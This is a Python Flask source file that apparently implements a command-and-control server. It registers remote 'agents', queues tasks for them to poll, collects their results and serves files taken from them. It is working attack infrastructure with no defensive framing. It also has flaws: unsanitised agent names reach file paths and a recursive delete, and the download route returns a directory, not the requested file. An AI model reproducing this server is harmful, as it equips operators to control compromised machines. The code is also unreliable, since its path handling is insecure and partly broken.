from flask import Flask, request, jsonify, send_file
import os
import random
import string
import json
import shutil

app = Flask(__name__)

# Mock database for agents
agentsDB = []

# Ensure the data directory exists
os.makedirs("data/agents", exist_ok=True)

@app.route('/agents', methods=['GET'])
def list_agents():
    """List registered agents"""
    return jsonify(agentsDB), 200

@app.route('/register', methods=['POST'])
def register_agent():
    """Register a new agent"""
    name = ''.join(random.choice(string.ascii_uppercase) for _ in range(10))
    remote_ip = request.remote_addr
    hostname = request.form.get("hostname")
    agent_type = request.form.get("type")
    agent = {'name': name, 'ip': remote_ip, 'hostname': hostname, 'type': agent_type}
    agentsDB.append(agent)
    print(agentsDB)
    
    # Create agent directory
    agent_dir = f"data/agents/{name}"
    os.makedirs(agent_dir, exist_ok=True)
    
    return jsonify({'name': name}), 200

@app.route('/tasks/<name>', methods=['POST'])
def send_task(name):
    """Send a task to an agent"""
    task_type = request.form.get("type")
    task_data = request.form.get("data")
    tasks_file = f"data/agents/{name}/tasks.json"
    results_file = f"data/agents/{name}/results.json"
    agent_path = f"data/agents/{name}"

    if os.path.exists(results_file):
        with open(results_file, 'r') as f:
            results = json.load(f)
        if results == ["Agent terminated successfully"]:
            try:
                shutil.rmtree(agent_path)
            except OSError as e:
                print(f"Error: {agent_path} : {e.strerror}")
            return '', 400
        else:
            pass

    # Ensure the tasks file exists
    if not os.path.exists(tasks_file):
        with open(tasks_file, "w") as f:
            json.dump([{"type": task_type, "data": task_data}], f)
            return '', 200
    elif os.path.exists(tasks_file):
        with open(tasks_file, "r+") as f:
            tasks = json.load(f)
            tasks.append({"type": task_type, "data": task_data})
            f.seek(0)
            json.dump(tasks, f)
            return '', 200
    else:
        return '', 500


@app.route('/tasks/<name>', methods=['GET'])
def serve_tasks(name):
    """Serve tasks to an agent"""
    tasks_file = f"data/agents/{name}/tasks.json"
    
    if os.path.exists(tasks_file):
        with open(tasks_file, "r") as f:
            tasks = json.load(f)
        os.remove(tasks_file)
        return jsonify(tasks), 200
    else:
        return jsonify([]), 204

@app.route('/results/<name>', methods=['POST'])
def receive_results(name):
    """Receive results from an agent"""
    result = request.form.get("result")
    results_file = f"data/agents/{name}/results.json"
    
    try:
        if not os.path.exists(results_file):
            with open(results_file, "w") as f:
                json.dump([result], f)
                return '', 200
        elif os.path.exists(results_file):
            with open(results_file, "w") as f:
                f.truncate(0)
                json.dump([result], f)
                return '', 200
        else:
            return '', 500
    except OSError as e:
        print(f"Error: {results_file} : {e.strerror}")
        return '', 500
    
@app.route('/results/<name>', methods=['GET'])
def view_results(name):
    """View results from an agent"""
    results_file = f"data/agents/{name}/results.json"
    agent_path = f"data/agents/{name}"
    
    if os.path.exists(results_file):
        with open(results_file, "r") as f:
            results = json.load(f)
        if results == ["Agent terminated successfully"]:
            try:
                shutil.rmtree(agent_path)
                return jsonify(results), 200
            except OSError as e:
                print(f"Error: {agent_path} : {e.strerror}")
        else:
            return jsonify(results), 200

    else:
        return jsonify([]), 404

@app.route('/download/<agent_name>/<file_name>', methods=['GET'])
def download_file(agent_name, file_name):
    """Download a file from an agent"""
    file_path = f"data/agents/{agent_name}"
    
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    elif not os.path.exists(f"data/agents/{agent_name}/{file_name}"):
        os.mkdir(f"data/agents/{agent_name}")
        return send_file(file_path, as_attachment=True)
    else:
        return '', 404

if __name__ == '__main__':
    app.run(host='192.168.207.1', port=8000)
